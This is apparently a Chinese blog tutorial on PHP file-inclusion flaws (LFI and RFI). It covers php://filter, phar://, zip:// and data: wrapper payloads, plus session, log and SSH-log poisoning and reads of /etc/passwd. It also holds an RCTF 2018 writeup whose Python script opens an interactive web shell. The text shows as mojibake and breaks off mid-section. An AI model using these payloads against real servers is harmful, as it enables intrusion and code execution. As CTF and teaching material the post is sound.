<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="vQAQv"><meta name="description" content="å–œæ¬¢ç”µå½±ï¼Œå–œæ¬¢ç¾é£Ÿï¼Œå–œæ¬¢æ—…æ¸¸ï¼Œä¹Ÿå–œæ¬¢ä½ ğŸ’–~"><link rel="icon" href="/favicon.png"><title>phpæ–‡ä»¶åŒ…å« - vQAQv's blog | Just Do It!</title>
<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
<!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]-->
<script src="/js/jquery-3.1.1.min.js"></script>

<script src="/js/fancybox/jquery.fancybox.min.js"></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="vQAQv's blog | Just Do It!" type="application/atom+xml">
</head><body style="opacity:1"><header class="head"><h1 class="head-title u-fl"><a href="/">vQAQv's blog | Just Do It!</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">Archives</a></li><li class="head-nav__item"><a class="head-nav__link" href="/about">About Me</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-05-24T03:00:00.000Z">äº”æœˆ 24, 2018</time><h1 class="post__title"><a href="/2018/05/24/phpæ–‡ä»¶åŒ…å«/">phpæ–‡ä»¶åŒ…å«</a></h1><div class="post__main echo"><center><h2> `"æ‰€è°“åšå®¢ï¼Œåªä¸è¿‡æ˜¯å­¤èŠ³è‡ªèµç½¢äº†"`</h2></center>
<span id="more"></span>

<h1 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h1><p>phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<p>reuqire() å¦‚æœåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­æœ‰é”™ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸å­˜åœ¨ç­‰ï¼Œåˆ™ä¼šç›´æ¥é€€å‡ºï¼Œä¸æ‰§è¡Œåç»­è¯­å¥ã€‚<br><img src="/image/php_file_include/1.png" alt="require"></p>
<p>include() å¦‚æœå‡ºé”™çš„è¯ï¼Œåªä¼šæå‡ºè­¦å‘Šï¼Œä¼šç»§ç»­æ‰§è¡Œåç»­è¯­å¥ã€‚</p>
<p><img src="/image/php_file_include/2.png" alt="include"></p>
<p>require_once() å’Œ include_once() åŠŸèƒ½ä¸require() å’Œ include() ç±»ä¼¼ã€‚ä½†å¦‚æœä¸€ä¸ªæ–‡ä»¶å·²ç»è¢«åŒ…å«è¿‡äº†ï¼Œåˆ™ require_once() å’Œ include_once() åˆ™ä¸ä¼šå†åŒ…å«å®ƒï¼Œä»¥é¿å…å‡½æ•°é‡å®šä¹‰æˆ–å˜é‡é‡èµ‹å€¼ç­‰é—®é¢˜ã€‚</p>
<p>å½“åˆ©ç”¨è¿™å››ä¸ªå‡½æ•°æ¥åŒ…å«æ–‡ä»¶æ—¶ï¼Œä¸ç®¡æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼ˆå›¾ç‰‡ã€txtç­‰ç­‰ï¼‰ï¼Œéƒ½ä¼šç›´æ¥ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æã€‚æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨åŒç›®å½•ä¸‹æœ‰ä¸ªphpinfo.txtï¼Œå…¶å†…å®¹ä¸º<code>&lt;? phpinfo(); ?&gt;</code>ã€‚åˆ™åªéœ€è¦è®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phpinfo.txt</span><br></pre></td></tr></table></figure>

<p>å³å¯æˆåŠŸè§£æphpinfoã€‚</p>
<p><img src="/image/php_file_include/3.png" alt="phpinfo"></p>
<h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><ul>
<li>å…·æœ‰ç›¸å…³çš„æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚</li>
<li>æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­å­˜åœ¨åŠ¨æ€å˜é‡ï¼Œæ¯”å¦‚ <code>include $file;</code>ã€‚</li>
<li>æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¯¥å˜é‡ï¼Œæ¯”å¦‚<code>$file = $_GET[&#39;file&#39;];</code>ã€‚</li>
</ul>
<h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><ul>
<li>LFI (Local File Inclusion)</li>
</ul>
<p>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé¡¾åæ€ä¹‰ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„æ–‡ä»¶åŒ…å«æ¼æ´éƒ½æ˜¯LFIã€‚ç®€å•çš„æµ‹è¯•ç”¨ä¾‹å¦‚å‰æ‰€ç¤ºã€‚</p>
<ul>
<li>RFI (Remote File Inclusion)</li>
</ul>
<p>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ˜¯æŒ‡èƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œã€‚ç”±äºè¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³æ€§ä¼šå¾ˆå¤§ã€‚<br>ä½†RFIçš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€è¦php.iniä¸­è¿›è¡Œé…ç½®</p>
<ol>
<li> <code>allow_url_fopen = On</code></li>
<li> <code>allow_url_include = On</code></li>
</ol>
<p>ä¸¤ä¸ªé…ç½®é€‰é¡¹å‡éœ€è¦ä¸ºOnï¼Œæ‰èƒ½è¿œç¨‹åŒ…å«æ–‡ä»¶æˆåŠŸã€‚</p>
<p><img src="/image/php_file_include/4.png" alt="RFI"></p>
<p>åœ¨php.iniä¸­ï¼Œallow_url_fopené»˜è®¤ä¸€ç›´æ˜¯Onï¼Œè€Œallow_url_includeä»php5.2ä¹‹åå°±é»˜è®¤ä¸ºOffã€‚</p>
<h1 id="åŒ…å«å§¿åŠ¿"><a href="#åŒ…å«å§¿åŠ¿" class="headerlink" title="åŒ…å«å§¿åŠ¿"></a>åŒ…å«å§¿åŠ¿</h1><p>ä¸‹é¢ä¾‹å­ä¸­æµ‹è¯•ä»£ç å‡ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>allow_url_fopen é»˜è®¤ä¸º On</li>
<li>allow_url_include é»˜è®¤ä¸º Off</li>
</ul>
<p>è‹¥æœ‰ç‰¹æ®Šè¦æ±‚ï¼Œä¼šåœ¨åˆ©ç”¨æ¡ä»¶é‡ŒæŒ‡å‡ºã€‚</p>
<h2 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopenä¸åšè¦æ±‚ã€‚</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
<p>å§¿åŠ¿ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/image/php_file_include/5.png" alt="php://"></p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>åˆ©ç”¨æ¡ä»¶ï¼šé»˜è®¤å‡å¯</p>
<p>å§¿åŠ¿ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.phpï¼Ÿfile=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æŒ‡å®šæœ«å°¾çš„æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–ç»base64åŠ å¯†åçš„æ–‡ä»¶æºç .</p>
<p>å…¶ä»–å§¿åŠ¿ï¼š</p>
<p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p>
<p>æ•ˆæœè·Ÿå‰é¢ä¸€æ ·ï¼Œå°‘äº†readç­‰å…³é”®å­—ã€‚åœ¨ç»•è¿‡ä¸€äº›wafæ—¶ä¹Ÿè®¸æœ‰ç”¨ã€‚</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0</span><br></pre></td></tr></table></figure>
<p>å§¿åŠ¿ï¼š</p>
<p>å‡è®¾æœ‰ä¸ªæ–‡ä»¶<code>phpinfo.txt</code>ï¼Œå…¶å†…å®¹ä¸º<code>&lt;?php phpinfo(); ?&gt;</code>ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/image/php_file_include/9.png" alt="phar://"></p>
<p>æŒ‡å®šç»å¯¹è·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar:///var/www/test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
<p><img src="/image/php_file_include/7.png" alt="7.png"></p>
<p>æˆ–è€…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆè¿™é‡Œtest.zipå°±åœ¨ä¸Šä¸€å±‚ç›®å½•ä¸‹ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://../test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
<p><img src="/image/php_file_include/6.png" alt="6.png"></p>
<h1 id="RCTF-2018-Backdoor"><a href="#RCTF-2018-Backdoor" class="headerlink" title="RCTF 2018 Backdoor"></a>RCTF 2018 Backdoor</h1><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2347">RCTF 2018 Writeup â€” De1ta</a></li>
</ul>
<p>ä¸€é“é¢˜è€ƒåˆ°äº†<code>php://filter</code> , <code>phar://</code></p>
<p><a target="_blank" rel="noopener" href="http://backdoor.2018.teamrois.cn/">http://backdoor.2018.teamrois.cn/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</span><br></pre></td></tr></table></figure>

<h2 id="post-php"><a href="#post-php" class="headerlink" title="post.php"></a>post.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¯»upload.phpæºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>

<h2 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> !== <span class="variable">$zip</span>-&gt;open(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;No a valid zip&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$zip</span>-&gt;getFromName(<span class="string">&#x27;tmp/random.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;No file&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dest</span> = <span class="string">&#x27;uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . hash(<span class="string">&#x27;sha256&#x27;</span>, file_get_contents(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) . <span class="string">&#x27;.zip&#x27;</span>;</span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$dest</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Saved into &#x27;</span> . <span class="variable">$dest</span>;</span><br></pre></td></tr></table></figure>
<p>post.phpå­˜åœ¨é™åˆ¶åç¼€çš„æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥é€šè¿‡phar://æˆ–è€…zip://åè®®ç»•è¿‡ï¼Œä»è€ŒåŒ…å«æ¶æ„ä»£ç getshellï¼Œupload.phpä¸­é™åˆ¶äº†ä¸Šä¼ çš„æ–‡ä»¶è¦æ˜¯ä¸ªzipå¹¶ä¸”é‡Œé¢è¦æœ‰ä¸ªrandom.txtæ–‡ä»¶ã€‚</p>
<p>æˆ‘ä»¬åœ¨å‹ç¼©åŒ…ä¸­å†åŠ å…¥ä¸€ä¸ª evil.php æ–‡ä»¶ï¼Œå½“é€šè¿‡post.php è®¿é—® action=phar://dest/evil æ—¶ï¼Œå³è®¿é—® phar://dest/evil.php æ³¨æ„ post.php ä¸­çš„ä»£ç include $_GET[â€˜actionâ€™] . â€˜.phpâ€™</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;Saved into &quot;</span></span><br><span class="line">post_url = <span class="string">&quot;http://backdoor.2018.teamrois.cn/post.php?action=upload&quot;</span></span><br><span class="line">zip_file = <span class="built_in">open</span>(<span class="string">&quot;tmp.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">upload_file = &#123;<span class="string">&#x27;file&#x27;</span>:zip_file&#125;</span><br><span class="line">r = requests.post(post_url,files=upload_file)</span><br><span class="line">dest = r.text[<span class="built_in">len</span>(s):]</span><br><span class="line">shell_url = <span class="string">&quot;http://backdoor.2018.teamrois.cn/post.php?action=phar://&quot;</span>+ dest + <span class="string">&quot;/evil&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] shell url: &quot;</span> + shell_url)</span><br><span class="line"><span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">    payload = &#123;<span class="string">&#x27;chybeta&#x27;</span>: <span class="string">&#x27;system(&quot;%s&quot;);&#x27;</span> % command&#125;</span><br><span class="line">    r = requests.get(shell_url,params=payload)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0<br>å§¿åŠ¿ï¼š<br>æ„é€ zipåŒ…çš„æ–¹æ³•åŒpharã€‚</p>
<p>ä½†ä½¿ç”¨zipåè®®ï¼Œéœ€è¦æŒ‡å®šç»å¯¹è·¯å¾„ï¼ŒåŒæ—¶å°†#ç¼–ç ä¸º%23ï¼Œä¹‹åå¡«ä¸Šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>

<p>data:URI schema<br>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>phpç‰ˆæœ¬å¤§äºç­‰äºphp5.2<br>allow_url_fopen = On<br>allow_url_include = On<br>å§¿åŠ¿ä¸€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/image/php_file_include/8.png" alt="data:text/plain,&lt;?php phpinfo();?&gt;"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/image/php_file_include/10.png" alt="system()"></p>
<p>å§¿åŠ¿äºŒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<p>åŠ å·+çš„urlç¼–ç ä¸º<code>%2b</code>ï¼Œ<code>PD9waHAgcGhwaW5mbygpOz8+</code>çš„base64è§£ç ä¸ºï¼š<code>&lt;?php phpinfo();?&gt;</code></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>çš„base64è§£ç ä¸ºï¼š<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<h2 id="åŒ…å«session"><a href="#åŒ…å«session" class="headerlink" title="åŒ…å«session"></a>åŒ…å«session</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šsessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚</p>
<p>å§¿åŠ¿ï¼š</p>
<p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p>
<p>å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®ï¼š</p>
<ul>
<li>/var/lib/php/sessions</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
<p>sessionçš„æ–‡ä»¶åæ ¼å¼ä¸ºsess_[phpsessid]ã€‚è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚<br><img src="/image/php_file_include/16.png" alt="16.png"></p>
<p>è¦åŒ…å«å¹¶åˆ©ç”¨çš„è¯ï¼Œéœ€è¦èƒ½æ§åˆ¶éƒ¨åˆ†sesssionæ–‡ä»¶çš„å†…å®¹ã€‚æš‚æ—¶æ²¡æœ‰é€šç”¨çš„åŠæ³•ã€‚æœ‰äº›æ—¶å€™ï¼Œå¯ä»¥å…ˆåŒ…å«è¿›sessionæ–‡ä»¶ï¼Œè§‚å¯Ÿé‡Œé¢çš„å†…å®¹ï¼Œç„¶åæ ¹æ®é‡Œé¢çš„å­—æ®µæ¥å‘ç°å¯æ§çš„å˜é‡ï¼Œä»è€Œåˆ©ç”¨å˜é‡æ¥å†™å…¥payloadï¼Œå¹¶ä¹‹åå†æ¬¡åŒ…å«ä»è€Œæ‰§è¡Œphpä»£ç ã€‚</p>
<p>æ¯”å¦‚è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">é€éLFIå¼•å…¥PHP sessionæª”æ¡ˆè§¸ç™¼RCE</a></p>
<p>ç¸½çµä¸€ä¸‹æ­¤æ¬¡ç¶“é©—</p>
<p>ç•¶é‡åˆ° LFI æ¼æ´æ™‚ï¼Œå¯ä»¥å…ˆæª¢æŸ¥ä¸€ä¸‹å¹¾ç¨®å¯èƒ½çš„æª”æ¡ˆï¼š</p>
<ul>
<li>/etc/passwd</li>
<li>/proc/self/environ</li>
<li>All possible config files ( e.g. Apache /etc/httpd/conf/httpd.conf )</li>
<li>Web server access, error log ( e.g. /etc/httpd/logs/access_log )</li>
<li>Session files ( e.g. /tmp/sess_{SESSION_ID} )</li>
<li>PHP ä½¿ç”¨ $_GET[1]ã€$_POST[1] å¯ä»¥é¿é–‹å¼•è™Ÿè·³è„«çš„å•é¡Œ(å‰é¢æåˆ°äº‹å¾Œå¾—çŸ¥$_GET[b]å³å¯æ­£å¸¸åŸ·è¡Œ)ã€‚<h2 id="åŒ…å«æ—¥å¿—"><a href="#åŒ…å«æ—¥å¿—" class="headerlink" title="åŒ…å«æ—¥å¿—"></a>åŒ…å«æ—¥å¿—</h2></li>
</ul>
<p>è®¿é—®æ—¥å¿—</p>
<p>å¸¸è§å‡ ä¸ªè·¯å¾„ï¼š</p>
<ul>
<li>/var/log/apache/access_log</li>
<li>/var/www/logs/access_log</li>
<li>/var/log/access_log</li>
</ul>
<p>æŸ¥çœ‹ log </p>
<p><code>/etc/apache2/sites-enabled/000-default.conf</code></p>
<p><img src="/image/php_file_include/11.png" alt="000-default.conf"></p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚</p>
<p>å§¿åŠ¿ï¼š</p>
<p>å¾ˆå¤šæ—¶å€™ï¼ŒwebæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´apacheã€‚åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥<code>access.log</code>ï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥<code>error.log</code>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¿å­˜è·¯å¾„åœ¨ <code>/var/log/apache2/</code>ã€‚</p>
<p>ä½†å¦‚æœæ˜¯ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸€äº›ç¬¦å·è¢«ç¼–ç ä½¿å¾—åŒ…å«æ— æ³•æ­£ç¡®è§£æã€‚å¯ä»¥ä½¿ç”¨burpæˆªåŒ…åä¿®æ”¹ã€‚<br><img src="/image/php_file_include/12.png" alt="12.png"></p>
<p>åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚</p>
<p>è¿™é‡Œæä¾›ä¸€é“åŒ…å«æ—¥å¿—çš„CTFé¢˜ç›®ï¼š<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon AppÃ©tit (100)-writeup</a></p>
<p>ä»¥åŠ<a href="http://cr4ckm3.top/2018/05/01/2018%E7%BA%A2%E5%B8%BD%E6%9D%AF/">2018çº¢å¸½æ¯</a></p>
<h2 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>éœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ä¸º <code>/var/log/auth.log</code></p>
<p>å§¿åŠ¿ï¼š</p>
<p>ç”¨sshè¿æ¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ssh &#x27;&lt;?php phpinfo(); ?&gt;&#x27;@remotehost</span><br></pre></td></tr></table></figure>
<p>ä¹‹åä¼šæç¤ºè¾“å…¥å¯†ç ç­‰ç­‰ï¼Œéšä¾¿è¾“å…¥ã€‚</p>
<p>ä¹‹åè¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯ã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a></p>
<h2 id="åŒ…å«environ-ç³»ç»Ÿç¯å¢ƒ"><a href="#åŒ…å«environ-ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="åŒ…å«environ ç³»ç»Ÿç¯å¢ƒ"></a>åŒ…å«environ ç³»ç»Ÿç¯å¢ƒ</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚<br>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚<br>å§¿åŠ¿ï¼š</p>
